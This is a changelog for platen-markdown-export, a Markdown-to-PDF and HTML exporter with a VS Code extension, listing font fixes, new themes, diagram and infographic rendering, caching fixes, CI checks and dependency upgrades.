# Changelog

All notable changes to **platen-markdown-export** and its VS Code extension, which
are versioned and released together.

Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/);
versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

- **Code no longer turns handwritten in a PDF with a hand-drawn infographic.**
  No theme names a code font, so inline code and code blocks got WeasyPrint's
  bare `monospace`. fontconfig turns that into a real font only through alias
  rules in its configuration. Without them, reported on Windows, it takes
  whichever font scores best. A hand-drawn infographic adds 851tegakizatsu to
  the whole document's fonts, and that font won. The PDF now names monospace
  fonts for each platform (Menlo, Consolas, DejaVu Sans Mono, …) ahead of the
  generic, before the theme's stylesheet, so a theme can still choose its own.
  The HTML export and the preview are unchanged: a browser resolves `monospace`
  itself.

## [1.0.1] - 2026-09-15

### Added

- **Live preview in the document's theme.** VS Code's built-in Markdown preview
  now shows an export document (frontmatter with `Mode`, `Theme` or `Style`) in
  its theme and style — fonts, palette, the style's heading colour, alerts,
  admonitions, tables — while you write, with no setup. Other Markdown files keep
  the preview's own look; `platenMarkdownExport.preview.enabled` turns it off.
  The stylesheets come from the export's own CSS, and the theme is chosen by the
  export's own precedence (`theme` setting → `Theme` → `EXPORT_THEME` →
  `default`). Markdown Preview Enhanced gets the same through **Markdown Export:
  Theme Markdown Preview Enhanced in This Workspace**, which writes a
  `.crossnote/parser.js` (and never replaces one with hooks of your own). Behind
  both is a new CLI flag, `--preview-kit <dir>` (with `--preview-format mpe` for
  MPE). A preview shows the text, not the pages: the cover, running headers,
  page numbers and rendered diagrams remain export-only.

- **The Platen theme**, the house theme for Platen Markdown Export: Songti SC
  headings over Georgia body text, a warm paper cover with paired printer's
  rules, the Platen wordmark, and four ink styles (`Ink`, `Oxblood`, `Forest`,
  `Indigo`). Select it with `Theme: Platen`. It ships its own copies of the
  brand logos and a full feature sample with an editable draw.io diagram.

- **`--pdf-variant`.** Tags the PDF with a conformance level — PDF/A (archival),
  PDF/UA (accessible), or PDF/X (print production) — instead of an ordinary
  PDF, e.g. `--pdf-variant pdf/a-2b`. Passed straight through to WeasyPrint's
  own `--pdf-variant`, validated against its exact enum up front so a typo
  fails with the full list of valid values rather than reaching WeasyPrint as
  a bare usage error. `EXPORT_PDF_VARIANT` sets a default the same way
  `EXPORT_PDF_DPI` does for `--dpi`, and a `PDF Variant` frontmatter field sets
  one per document — precedence is `--pdf-variant` → `PDF Variant` frontmatter
  → `EXPORT_PDF_VARIANT`. Verified end-to-end against a real document, both by
  flag and by frontmatter alone: the exported PDF's XMP metadata carries the
  correct `pdfaid:part`/`pdfaid:conformance`.

- **Card shadows on admonitions and GitHub-style alerts in the HTML export**,
  across every theme (`box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4)`). PDF output
  stays flat on purpose: `box-shadow` reached WeasyPrint in 70.0, but the
  result reads poorly at print resolution, so the rule is scoped to
  `body.html-export` — the class the standalone HTML pipeline already adds for
  exactly this kind of print/screen split — rather than applied everywhere.
  Cover elements were deliberately left alone in both outputs — the revision
  table is `background: transparent` by design (it sits on the cover's own
  gradient or photo) and the logo panel relies on an intentional page-edge
  bleed, neither of which a shadow reads against safely.

- **Mermaid and Graphviz diagrams keep colour emoji when the installed
  WeasyPrint can actually render them**, instead of always stripping them.
  Every diagram used to strip emoji unconditionally: Apple Color Emoji's SBIX
  format used to crash WeasyPrint through Homebrew's FreeType build ("Could
  not load fallback font, bailing out"). Whether that still happens is a
  property of the FreeType build behind one specific binary, not of the
  WeasyPrint version — so rather than gate on a version number, the real
  binary is probed once (a tiny SVG with a color-emoji glyph, rendered to a
  throwaway PDF) and the result cached for the process. The probe itself only
  runs when it can change the outcome: never for an HTML-only export (a real
  browser renders colour emoji natively — WeasyPrint is never involved), and
  never for a document with no Mermaid/Graphviz diagram at all.

- **Graphviz diagrams.** ` ```dot ` and ` ```graphviz ` fences are now laid out
  to SVG and embedded the same way Mermaid diagrams are. Unlike Mermaid it
  needs no headless browser: layout runs through a WASM build of Graphviz
  (`@hpcc-js/wasm-graphviz`) directly in the Node process, so there's no
  browser to launch, no network access to abort, and no `--setup` step —
  `npm install` alone is enough. A diagram that fails to parse falls back to
  an error block and raises a warning, so `--strict` refuses the document the
  same way a broken Mermaid diagram or missing image does. `Figure:` captions,
  the dark-mode inversion and each theme's page-height cap apply to them exactly
  as they do to Mermaid diagrams.

- **Infographics.** ` ```infographic ` fences render
  [AntV Infographic](https://github.com/antvis/infographic)'s declarative
  syntax — lists, sequences, hierarchies, comparisons and charts, 276
  templates — to SVG through the library's own server-side renderer, with no
  browser. Its raw output does not survive WeasyPrint: every label lives in a
  `<foreignObject>`, which WeasyPrint does not draw, so each one is rebuilt as
  native SVG text with the original colour, size, weight and alignment, wrapped
  against Arial's real metrics. Bold text is wrapped the way the library sized
  its box, which cuts the text boxes whose wrapped lines no longer fit from 41
  to 19 across all templates; every one left is a fixed slot holding more text
  than it was designed for, which overflows in a browser too — keep labels
  short. The library's remote font stylesheets are dropped and text is set in
  Arial. An unknown template name is refused, naming the closest real one when
  there is one, instead of the library quietly rendering a different template, and
  syntax it cannot parse fails at once instead of after its 10-second internal
  timeout. The library runs in a worker thread: its server-side DOM shim
  installs browser globals on `globalThis` and never removes them, and there
  they end with the thread instead of lasting for the rest of the export — and
  of a `--watch` session. `@antv/infographic` is pinned to an exact version.
  Every theme's sample document shows one, each in its own subject. Known
  limit: WeasyPrint draws nothing for a shape filled with a partly transparent
  gradient, so in a PDF 15 of the templates lose some shapes — the arrows
  between `sequence-steps-simple`'s steps, for one.

- **The `hand-drawn` theme's font.** That theme sets `font-family:
  851tegakizatsu` and the library expects the face from Ant Group's CDN, through
  the same stylesheet instructions this tool strips — so its sketched shapes
  arrived with every word in Arial. A 53 KB Latin subset of the typeface now
  ships in `assets/fonts/` (28.6 MB original; its licence allows both the subset
  and the redistribution, and `assets/fonts/*.NOTICE.md` is the attribution it
  asks for) and is embedded in each diagram that uses it. Embedded in the SVG
  rather than the page's CSS, because a browser renders an `<img>` SVG as its
  own document that page CSS cannot reach; and the family is quoted, since a CSS
  identifier may not start with a digit and unquoted `851tegakizatsu` voided the
  whole declaration — which is what made Chrome fall back to its default serif
  rather than to Arial. Wrapping is measured in the font's own metrics, so the
  lines match the glyphs drawn.

- **`--infographic-icons <iconify|weavefox|none>`** — where infographic icons
  come from, because the library's only icon source is Ant Group's WeaveFox
  service at `www.weavefox.cn`. Every request the library makes passes through
  a policy this tool enforces. `iconify`, the default, turns a lookup for a
  well-formed icon name (`mdi/home`) into a fetch of that one icon from Iconify
  and answers anything else "not found" without a request, so no document text
  but its icon names leaves the machine. `weavefox` sends lookups to WeaveFox
  unchanged — **data may go to servers in China** — and every export that did
  says so, and how many. `none` sends nothing. Also `EXPORT_INFOGRAPHIC_ICONS`,
  and in the VS Code extension a `platenMarkdownExport.infographicIcons`
  setting that is machine-scoped and warns, with a one-click way back, when
  switched to WeaveFox. There is deliberately no frontmatter key: a document you
  received must not be able to opt your machine into sending its text to a
  third party. An icon Iconify does not have is a counted warning, so
  `--strict` catches a typo; icons left out under `none` are not, since that
  was your choice.

### Changed

- **Every diagram figure now carries a shared `diagram-figure` class** beside
  its renderer's own (`mermaid-figure`, `graphviz-figure`,
  `infographic-figure`), and the built-in themes' page-height cap, the dark-mode
  inversion and `Figure:` captions target it. A theme of your own that styles
  `.mermaid-figure > img` still reaches Mermaid diagrams, but not the others —
  change it to `.diagram-figure > img`.

- **The status bar now says whether saving the open document will export it.**
  Export on save is deliberately silent — it runs on every save, and a
  notification each time would be unbearable — but silence and "not working"
  look identical. Reported as "the export does not trigger on save" when it was
  triggering: the outputs carried the same timestamp as the save, and what had
  actually happened was a release renaming them from `_Rev4` to `_Rev5`, so the
  file being watched stopped changing.

  With a Markdown document open the indicator is always present, and its tooltip
  names the reason when a save will *not* export: the setting is off, the
  document declares no `Mode:`, or it sets `Export On Save: false`. It reads the
  same predicate the save handler does, so the indicator and the behaviour cannot
  drift — they were the same question asked in two places.

### Fixed

- **Mermaid diagrams render from the VS Code extension again.** The bundler
  deletes packages the CLI cannot reach, and it started that walk from
  `dependencies` only. Once `playwright` became an `optionalDependency`, nothing
  reached it, so every `.vsix` shipped without it. Exporting a Mermaid diagram
  then failed with "Playwright is not installed", and `npm install playwright`
  could not help, because the bundled CLI only loads packages from its own
  folder. The extension's Chromium setup failed the same way. The walk now
  starts from `optionalDependencies` too, and the bundler fails the build when
  any of the CLI's dependencies is missing from the bundle. Its smoke test
  renders no Mermaid, so before this nothing checked.

- **Cover tables now use the theme's body font.** Every theme's cover set the
  revision table and the document-details rows in `--font-heading`, while the
  tables in the document use the body font. That only shows where the two fonts
  differ: Modern's cover tables were in Rubik while its body uses Valley Sans.
  They now use `--font-body` in every theme. The cover title, subtitle, slogan
  and address keep the heading font. Tests fail if a theme sets a font on
  document tables, or anything but `--font-body` on cover tables.

- **The abbreviation glossary now looks like every other table in the theme.**
  Each theme carried a `.glossary-table` block that overrode its own table
  styling, and only partly. It gave the glossary its own font size, grey rules
  and a transparent header, but where the theme's own table selector was more
  specific, part of the override lost. So the glossary was the one table that
  matched neither its theme nor its own intended look. The block is gone from
  every theme, along with its dark-mode counterpart in the HTML export. Only the
  page break and a bold, non-wrapping abbreviation column remain, and a test
  fails if any theme styles `.glossary-table` again.

- **TOC page numbers in every theme's table of contents now resolve to real
  page numbers instead of `0`.** All 12 shipped themes built the TOC's dot
  leader and page number as one flex row (`display: flex` on the entry,
  `target-counter(attr(href), page)` in a `::before` flex item). WeasyPrint
  70's `target-counter()` silently resolves to `0` when its generated content
  sits inside a flex item — verified with an identical rule outside a flex
  container, which resolves correctly — so every PDF's table of contents
  showed `0` for every single entry, regardless of theme or document size.
  Reproduced in a two-heading test document with the default theme, so it was
  never specific to one theme or one document's complexity.

  Fixed by dropping flex entirely for the PDF pipeline and using `leader()`
  — the CSS Paged Media primitive built for exactly this "text … dots … page
  number" shape — alongside `target-counter()` in a single `::after`. The
  standalone HTML export pipeline (`.html-export` on `<body>`) keeps the
  original flex + `border-bottom` dot leader with no page number, since
  `leader()`/`target-counter()` are print-only CSS no browser implements —
  Chrome drops an unrecognized `content` declaration entirely, which would
  otherwise have silently removed the HTML export's dot leader too.

- **A document using an external theme now exports from anywhere, not just the
  extension.** `--theme-path` has to be supplied on every invocation, so the VS
  Code extension (which passes it from a setting) exported fine while the same
  document from a task, a terminal or CI failed with `Theme not found` — naming a
  theme that *is* installed, just not on that run's search path.

  A document is not portable if the only place its theme is known is one editor's
  settings. The search path is now also discovered: a `platen-markdown-export.json`
  beside the document, or anywhere above it, may declare `themePaths`. It is found
  by walking up from the **document** rather than the working directory, so it
  works whatever the command was run from; relative entries resolve against the
  config file, which is what makes a committed `./themes` work on every checkout;
  `~` expands. A per-user file at `~/.config/platen-markdown-export/config.json`
  (`%APPDATA%` on Windows) sets a machine-wide default.

  Precedence: `--theme-path` → `EXPORT_THEME_PATH` → nearest project config → user
  config. The more deliberate the source, the more it wins.

- **The wizard writes the name a theme calls itself, not the folder it sits in.**
  It wrote `Theme: acme-theme` — an artefact of one machine's layout — where the
  theme's manifest declares `Acme`. The declared name is the theme's identity: it
  is what the cover shows, it survives the folder being moved or renamed, and it
  is what someone would have typed by hand. Both still resolve, so documents the
  wizard has already written keep working.

- **`Theme not found` now names the durable fix**, not just what was searched: a
  config file recorded beside the work, rather than a flag remembered per
  invocation.

- **Both context menus now carry one "Markdown Export" submenu.** The commands
  were declared and rendering — in a *custom* group, which VS Code appends after
  every predefined one. Five flat entries therefore landed below Cut/Copy/Paste
  and Command Palette in the editor, and below Delete in the explorer: present,
  and easy to miss entirely.

  One shared submenu now sits in `1_modification` in the editor (beside Format
  Document) and at the end of `navigation` in the explorer (beside Open). Inside,
  the frontmatter commands come first, then the export modes and the release.

  Right-clicking a *folder* offers only the new-document wizard — a folder is not
  a document, so exporting or releasing it means nothing. That is done with
  `!explorerResourceIsFolder`, which is unset in an editor, so the full set still
  shows when right-clicking inside a document.

  Four assertions cover the class of bug rather than the instance: no entry in
  either context menu may sit in a custom group; every referenced submenu must be
  declared and non-empty (an entry pointing at an undeclared id is dropped
  silently, with nothing in the UI to say why); a folder is offered only what
  applies to one; and the every-command-on-both-menus check follows submenus,
  since what matters is that a right-click can reach a command, not which level
  it is declared on.

- **The frontmatter wizard was unreachable from a Markdown file.** It was
  registered, worked, and had passing tests — while appearing only on the
  *explorer* context menu and in the command palette. Right-clicking inside an
  open document showed the static template and no wizard, which is exactly where
  someone looks for one.

  Registration is not discoverability, and the tests asserted the former. They now
  assert that every document command appears on **both** context menus, that
  nothing is gated on a `when: "true"` literal (a command is palette-visible by
  default; such an entry can only ever hide it), and that the frontmatter commands
  are findable by searching for the word "frontmatter" — which
  "New Document (wizard)…" was not.

- **`--theme-path` now accepts a theme folder, not only a folder of theme
  folders.** Pointing it at `~/Dev/my-theme` — which is what "add my external
  theme" means to anyone holding one — found nothing, and the export then failed
  with `Theme not found: "X"`, naming the theme rather than the folder that did
  not contain it. That sends you looking in exactly the wrong place. A root that
  holds a `theme.json` directly is now itself a theme; a root of theme folders
  still works as before.

- **A theme resolves by the name its manifest declares, as well as its folder's.**
  Every theme that ships here disagrees with its own directory —
  `markedapp-byword` calls itself `Byword`, `roryg-ghostwriter` calls itself
  `Ghostwriter` — and only the directory name resolved. That went unnoticed
  because the bundled folders happen to be named closely enough, and it surfaced
  the moment an external theme in a folder called `acme-theme` declared itself
  `Acme` and a document reasonably wrote `Theme: Acme`.

  Listings keep showing the folder name, which is the identity every document,
  script and CI job already uses; the declared name is shown beside it and
  accepted as an alias.

- **A failed theme lookup says what IS available.** It listed the directories it
  had searched, which asks you to go and check them by hand. It now names the
  themes it found, with both spellings where they differ.

### Added

- **External theme folders.** `--theme` always accepted a directory; what
  `--theme-path` (and `EXPORT_THEME_PATH`) add is *discovery* — point the tool at
  a folder of themes and they can be listed, picked and validated by name rather
  than only exported with by path. An external theme shadows a built-in of the
  same name, which is how you override the bundled `default`, and the run says so
  when it happens.

  A CLI concept rather than an editor setting on purpose: the terminal, the VS
  Code extension and anything else driving this tool have to agree about which
  themes exist. `--list-themes --json` reports each theme's directory and source
  so a UI can read it without scraping the human listing.

- **`--inspect`** prints a document's resolved frontmatter as JSON and stops —
  reads the document, renders nothing, writes nothing. It answers questions
  tooling has to ask *before* acting: the extension checks whether the revision it
  is about to release already carries a note. The resolved view, not the raw YAML,
  so a caller does not re-implement mode normalisation, revision precedence or
  `isReleasedStatus`.

- **`--release-note <text>`** sets the `Remarks` of the revision being released —
  the current last `Revisions` row, describing the work being signed off, which is
  the row the cover's revision table shows. `--release` still appends the next
  row with an empty remark of its own, because nothing has happened in it yet. A
  usage error without `--release`: a note with nothing to attach it to would
  otherwise vanish while the export looked like it succeeded.

- **`--init --answers <file.json>`** fills the frontmatter scaffold in from an
  answer object instead of the placeholders. Answered values are quoted only where
  YAML requires it, so a title with a colon, an author with a comma and a status
  of `No` all survive — and the plain `--init` output is byte-identical to before.

- **VS Code: a frontmatter wizard for the document you already have open.**
  *Markdown Export: Frontmatter Wizard (fill in this document)…* asks the same
  questions the new-document wizard asks and inserts the result at the top of the
  current file — into the buffer, so it lands in the undo stack — refusing a
  document that already has a block, as the static insert does. `insertFrontmatter`
  drops a template with placeholders to edit by hand and `newDocument` only ever
  creates a new file; a document you had already started had neither.

- **VS Code: a new-document wizard.** *Markdown Export: New Document (wizard)…*
  walks through title, author, theme, cover style, export mode and the optional
  document controls, then writes the file. The frontmatter comes from the CLI's
  own `--init --answers`, so there is one implementation of the scaffold and it is
  the one the exporter parses.

- **VS Code: external theme management.** *Add External Theme Folder…* registers a
  folder after asking the CLI whether it actually contains themes — a mistyped
  path otherwise fails later, at export time, as "Theme not found", which names
  the theme rather than the folder and sends you looking in the wrong place.
  *Select Theme…* picks from every theme the CLI can see, built-in and external.
  Backed by a new `platenMarkdownExport.themePaths` setting, plus
  `platenMarkdownExport.defaultAuthor` for the wizard.

- **Extension-host integration tests.** `vscode-extension/npm run test:integration`
  launches a real VS Code and drives the commands inside it: that the ids in the
  manifest are the ids `activate()` registers, that the new settings resolve with
  their declared defaults, that the wizard's prompts end in the document they
  describe, and that the release prompt appears only when the outgoing revision
  has no note — and that dismissing it abandons the release rather than cutting
  one silently.

  The prompts are stubbed rather than clicked: the host and the suite share one
  `vscode` module instance, so replacing `window.showInputBox` replaces the one
  the extension calls. This half used to be covered by pressing F5, which is the
  slowest check in the project and the one most likely to be skipped. Runs in CI
  under `xvfb`; the launcher reuses an installed VS Code on a developer machine.

### Changed

- **VS Code: releasing is on the context menus, and asks for the note.** The
  release command existed but was reachable only from the command palette. It is
  now on the editor and explorer context menus for any Markdown file, and it
  prompts for a release note when — and only when — the revision being released
  has none. Escape abandons the release; an empty box releases without a note,
  which is exactly what happened before the prompt existed. A document the CLI
  cannot read does not prompt: `--release` reports that problem itself, in its own
  words, rather than through a question that could not be asked accurately.

- **`yamlScalar`** joins `yamlQuote`: bare where that is safe, quoted where it is
  not. `yamlQuote` always quotes, which is right for an author carried into an
  appended revisions row and wrong for the `--init` scaffold — people read that as
  documentation, and quoting all of it turns every example line into
  `Title: "Document Title"` for the benefit of the rare value that needs it.

### Fixed

- **A stylesheet that could not be fully inlined is no longer cached.** Every
  failure path in the icon-font inliner *removes* what it could not fetch — a
  dropped `@import`, a `url()` left pointing at the network — and then returned
  normally, which read as success to a caller that only looked at the resulting
  string. That caller wrote the string to the permanent on-disk cache. One
  transient CDN blip therefore produced a silently wrong export **forever**:
  every later run logged `Icon font ready: … (disk cache)`, made no network
  request at all, and raised no warning, so not even `--strict` could see it. The
  only remedy was knowing `--clear-cache` existed.

  `inlineCssRecursive` and `inlineFontsInCss` now report whether the inline was
  complete, and only a complete one earns a cache entry. A degraded run says so,
  every run, and retries the next time.

- **`data-src` is no longer mistaken for `src`.** `images.ts` matched `src=`
  without requiring whitespace before it, so it also matched the tail of
  `data-src=`. A `<img data-src="lazy.png">` was reported as a missing image
  (exit 6 under `--strict`), and on a tag carrying both attributes the inlined
  data URI was written into `data-src` while the real `src` kept pointing at a
  local file — leaving the "self-contained" HTML export unable to reach its own
  images, and carrying a large dead payload besides.

  The rule was already right in `drawio.ts` and `stylesheets.ts`; it had simply
  never been propagated. All three now share `attributes.ts`.

- **A rejected CSS `@import` is no longer replayed for the rest of a `--watch`
  session.** The in-process import map cached promises, including rejected ones,
  and `--watch` re-enters `main()` in the same process — so one transient failure
  disabled icon fonts until the process was restarted, with nothing retrying.
  Rejections are now evicted where they are caught, and the map is cleared per
  run.

- **`prependPath` used a hardcoded `;` separator.** Correct on Windows, where it
  was the only caller; wrong everywhere else, and the macOS installer now uses
  the same seam. It uses `path.delimiter`.

### Changed

- **`playwright` is now an `optionalDependency`.** It is a whole
  browser-automation library, plus a browser binary, carried for one feature most
  documents never use — and `mermaid.ts` already loaded it lazily. An install that
  cannot fetch it (an offline registry, an unsupported platform) now succeeds
  instead of failing outright, and a document containing a Mermaid diagram fails
  with a sentence naming the remedy instead of a `MODULE_NOT_FOUND` stack trace
  under the generic exit 1. A missing *package* and a missing *browser* are told
  apart, because they need different commands to fix.

  To drop it deliberately, uninstall the package. `npm install --omit=optional`
  is **not** the way: the flag is not package-scoped, and sharp ships its own
  platform binaries as optional dependencies, so omitting them breaks image
  handling with a far worse error.

- **Phosphor icons load from jsDelivr rather than unpkg.** Byte-for-byte the same
  files (verified: 78 131 bytes for `src/regular/style.css` from either), but
  unpkg is a single origin with a history of rate-limiting, and Phosphor is the
  icon font that fails hardest when a fetch drops — every weight arrives through
  an `@import`. Font Awesome stays on cdnjs, which does not carry Phosphor at all.

- **Cache entries carry a schema stamp.** `CACHE_SCHEMA` is part of every entry
  filename, so a release that changes how CSS is flattened or an image is encoded
  cannot keep serving output built by the previous one. Stale-schema entries are
  swept on the next write rather than accumulating.

- **Two exports racing for one document now give the same advice wherever it is
  detected.** The revision-*bump* guard said only "skipping the revision bump",
  which read as noise — so a release you thought you had cut silently had not
  been. Both guards now share `CONCURRENT_EXPORT_HINT` and name the fix.

### Added

- **`npm run check`** — every gate CI runs, in CI's order
  (`check:versions`, `check:changelog`, `lint`, `test`, `verify:pdf`). Two of
  those were reachable only on a runner: `check:changelog` failed *after* a tag
  was pushed, and nothing prompted anyone to run `verify:pdf` locally, so a
  rendering regression reached CI before its author saw it. `verify:pdf` reports
  a skip on a machine with no WeasyPrint; CI passes `--require` so it is never
  skipped there.

- **`attributes.ts`** — one place to read and write an HTML attribute
  (`attrOf`, `setAttr`, `attrValues`, `findTags`, `tagWithAttrValue`). Three
  modules had each grown their own pattern, each added after a user found the
  previous one ignoring a spelling `html: true` allows; six copies, two rules
  between them, and one module missing the second. Consolidated, and pinned by
  `src/tests/attributes.test.ts`.

- **`executeExport`** — the doing half of `main()`, split out so the rules that
  lived at the bottom of a 264-line function are directly testable: the shared
  render happening once, the source stamp being earned by the first output that
  lands, the revision bump waiting for every output, and `--strict` being judged
  after the output is written. `main()` is 264 → 166 lines.

- **Tests for the macOS installer ladder and the icon-font disk cache**, neither
  of which had any. Coverage floors ratcheted 85/80/80 → 88/82/82 (measured
  90.67 / 83.67 / 84.01).

### Breaking

- **Upgrading brings a new Playwright, so re-run `--setup` before your next
  Mermaid export.** Playwright pins its browser build to the package version, so
  moving `playwright` orphans the Chromium already on your machine — 1.63.0 wants
  `chromium-1243` where 1.62.1 used `chromium-1234`. The export fails partway
  through with `Chromium for Playwright is not installed`, and the fix is exactly
  what that message says: `platen-markdown-export --setup`, or
  `npx playwright install chromium`.

  Nothing in CI can catch this on your behalf, and it is worth knowing why: every
  job installs the browser fresh against whatever `playwright` is in the
  lockfile, so no run ever has an existing install to invalidate. Only a real
  upgrade does. `--dry-run` now checks for the browser when a document contains
  Mermaid, so `--dry-run --strict` catches it before a real export does.

  Documents with no Mermaid diagrams are unaffected — Chromium is only loaded to
  render one.

- **Cutting a release now takes `--release`.** It used to happen on *any* export
  of a document whose `Status` was `Released`: the `Revisions` row appended, every
  `Revision:` scalar bumped, the status reset. That is right for the export you
  meant as a release and wrong for the other three ways an export happens — the
  VS Code extension firing on save, a CI run, a colleague re-exporting to read it
  — and holding it back took three separate switches (`--no-bump`,
  `--no-revision-bump`, `Export On Save: false`). A default nobody wants, with
  machinery to turn it off, is the wrong way round.

  `Status: Released` still guards it: the status is the document declaring it is
  final, the flag is you saying cut it now. The revision *date* is still stamped
  by every export, so an exported file and its source never disagree about the
  document's date.

  **To migrate:** add `--release` to the export you use to cut a release, or use
  the extension's new **Markdown Export: Export and cut a release** command.
  `--no-revision-bump` is still accepted and now does nothing.
- **Node.js ≥ 20.9 is now required** (was ≥ 18). sharp 0.35, taken to clear four
  high-severity libvips CVEs, declares `engines.node: ">=20.9.0"`, and its
  prebuilt binaries do not load on 18 at all — the suite fails outright with
  "Could not load the sharp module". Node 18 went end-of-life in April 2025, so
  the alternative was shipping a known-vulnerable image library in order to stay
  compatible with an unsupported runtime. The CI floor moved with it.

### Added

- `--dry-run`: validate a document and report what it *would* write, without
  rendering or writing anything. Checks the theme, style and colour keys, the
  stylesheet, the output paths, that WeasyPrint is present for a `pdf` mode and
  that Chromium is present for a document with Mermaid. For a Markdown input it
  also renders the markdown, so an unresolved `[!include]` and a missing local
  image are reported too; an `.html` input is not scanned for either yet. The
  source document is left byte-for-byte as it was found. It exists
  because `Mode:` in the frontmatter had no CLI override meaning "produce
  nothing", so a document could not be checked without also producing a file.
- `--strict`: exit 6 if the run raised any warning — a missing image, an
  unresolved include, a font that failed to fetch. An export with a broken
  reference otherwise exits 0 and writes the file anyway, with the dead
  reference in it; right for a draft, wrong for a pipeline, which had no way to
  notice. The output is still written under `--strict` and only the exit code
  refuses it, because seeing the broken artifact is usually how you work out
  what the warning meant. `--dry-run --strict` is the pre-commit shape: it
  refuses a broken document without producing a file.
- `--init`: print a starter frontmatter block on stdout —
  `platen-markdown-export --init > report.md`. The VS Code extension could
  already scaffold one; there was no way to start a document without it. It
  prints rather than writes because the CLI has no business creating or editing
  a file the user has not named.
- `--clear-cache`: delete the on-disk cache of immutable remote assets (icon-font
  CSS, Twemoji) and exit. Entries there are trusted on the next read and inlined
  straight into a PDF, and nothing expires them — so a truncated write or a bad
  fetch was served happily forever, and the only remedy was knowing the
  platform's cache path and deleting it by hand.
- **`paletteNames` in `theme.json`** — optional per-palette naming for the CSS a
  palette generates: `slug` replaces the lowercased palette name in
  `--<slug>-<stop>`, `aliases` add extra class spellings beside
  `.<theme>-<slug>-scheme`. For a theme ported from another project whose
  variable and class names documents may already carry. It replaces a hardcoded
  table in `src/css.ts` that named one private theme's palettes, so every
  checkout of the exporter carried that theme's vocabulary. Documented in
  `docs/THEMES.md`.
- `npm run verify:pdf:all` and a CI job that renders the fixture through **every**
  shipped theme, not just the default one. `cover.test.ts` asserts each theme's
  cover template carries the right token slots, but a template can hold every
  slot and still fail to lay out — and only one theme was ever actually rendered
  on a commit. `release.yml` runs the same matrix, so the release gate is no
  longer weaker than the pull-request gate.
- `npm run verify:samples` and a weekly `Render the sample documents` workflow
  that exports all twelve `themes/*/sample *.md`. Those are the showcase and the
  de-facto documentation — what a new user copies from — and nothing rendered
  them on a commit, so a sample that had rotted was invisible until somebody
  tried it. Scheduled rather than per-PR because they need Chromium, draw.io and
  the network, which the minimal fixture deliberately does not.
- `check:versions` now refuses `@types/vscode` ahead of `engines.vscode`. The
  types say which VS Code API the extension compiles against and the engine says
  the oldest VS Code it claims to run on; ahead of the engine, the code can call
  an API the declared minimum does not have, and `vsce` refuses to package it at
  all. Nothing in CI runs `vsce` — only the release workflow does — so a grouped
  dependency bump of it passed every pull-request check and would have failed
  while cutting a release.
- `platenMarkdownExport.strict` setting in the VS Code extension, mapping to the
  CLI's `--strict`.
- `--no-revision-bump`: skip only the post-release revision bump while still
  stamping the revision date. The VS Code extension passes it on every
  save-triggered export, so an automatic export never cuts a release.
- End-to-end PDF verification (`npm run verify:pdf`, plus a CI job) that exports a
  real PDF through WeasyPrint and asserts the page tree is readable. The unit
  suite deliberately never runs WeasyPrint, so nothing previously exercised the
  tool's actual output on a commit.
- `npm run watch` for an incremental TypeScript rebuild.
- `npm run version:set -- <version>` to set the version everywhere it has to
  agree — both manifests and both lockfiles.
- `--watch`: re-export whenever the input document changes, until interrupted.
  Recognises the export's own write-back to the source by content, so it neither
  loops on itself nor drops an edit made during a run.
- `Export On Save: false` frontmatter — a per-document opt-out from the VS Code
  extension's export-on-save, for a document that should be exported by hand.
  Read by the extension alone; the CLI ignores it.
- CI now runs lint + tests on Windows and macOS as well as Linux. The
  platform-specific code (`bootstrap.ts`'s installers, `openCommand`'s PowerShell
  branch, the per-platform icon-cache directory) had never been exercised on the
  platforms it targets.
- A coverage floor in CI (`npm run test:coverage`), set just under the measured
  figures so a real drop fails the build.
- A weekly `Runtime setup` workflow that runs `--setup` and then a real PDF
  export on Windows and macOS. The Windows WeasyPrint installer — the most
  fragile code in the repo — was previously exercised by nothing.
- Dependabot for both npm manifests and the GitHub Actions versions, grouped and
  weekly; plus an `npm audit --omit=dev --audit-level=high` job.
- `npm run check:changelog`, run by the release workflow: a tag can no longer
  ship with everything still sitting under `## [Unreleased]`.
- Dependency updates: sharp 0.34.5 → 0.35.4 (the CVEs above), katex 0.16.47 →
  0.18.6, highlight.js 11.10.0 → 11.12.0, playwright 1.58.2 → 1.63.0, plus
  transitive fixes.

  The markdown-it family moved together, because it could not move apart:
  markdown-it 14.1.1 → 15.0.1, markdown-it-anchor 9.2.0 → 10.0.0,
  markdown-it-attrs 4.3.1 → 5.0.1, markdown-it-deflist 3.0.1 → 4.0.0.
  markdown-it-anchor 10's types are written against markdown-it's own
  declarations rather than `@types/markdown-it`, so taking it without markdown-it
  15 does not compile. markdown-it 15 bundles its own types, so
  `@types/markdown-it` is gone. **The rendered output does not change** — the
  golden HTML export is byte-identical across all four.

  Playwright pins its browser to the package version, so run `--setup` after
  pulling; see the Breaking note above for why no CI job can catch that for you.
- A test suite for `stylesheets.ts` — icon-font detection, the per-platform cache
  directory, and remote-stylesheet inlining against a loopback server. It was the
  module that reaches the network and writes a disk cache, and the least covered.
- **`--watch` follows the document's dependencies.** Each export now reports the
  files it actually read — includes, local images, draw.io sources, the
  stylesheet — and the watch re-points at that set afterwards. Editing a chapter
  re-exports the book that includes it, which is what anyone using `[!include]`
  expected the first time; before, only the file named on the command line
  triggered a run. The set follows the document as it changes: add an include and
  its file is watched from the next run onwards. Files that merely sit beside a
  dependency are not watched — only the ones actually used.
- **The emoji are cached on disk**, in the same per-user cache the icon fonts
  already used (now a shared `cache.ts`). Emoji are the one thing worth caching:
  they are pinned to a Twemoji release, so the bytes behind a URL never change,
  and `wrapEmoji` emits an `<img>` per occurrence — a document with three of them
  fetched three files from a CDN on every export, which with export-on-save meant
  every ⌘S. The same document now exports on a train. Nothing else is cached: a
  document's own remote image is expected to change under us.
- **The VS Code extension has tests.** It shipped ~670 lines with none — including
  two functions whose own comments said they were exported for testing.
  `extension.ts` imports `vscode` at its top, so nothing in it could be loaded by
  a `node --test` process; its editor-free logic now lives in
  `vscode-extension/src/core.ts` and is covered by `src/tests/core.test.ts` (40
  tests): what makes a save trigger an export, the per-document `Export On Save`
  opt-out, the CLI identity check, and the exit-code table. CI compiles, lints
  and now tests the extension.
- Coverage for the Mermaid SVG post-processing — the `<foreignObject>` → `<text>`
  rewrite, the emoji strip and the viewBox sizing that make a browser-rendered
  diagram survive WeasyPrint. It was the least-covered module at 55%, which is a
  bad place for a gap: librsvg renders a broken diagram rather than failing, so a
  regression there ships a PDF with the labels missing and nothing to notice. The
  three functions are pure string work and need no Chromium.
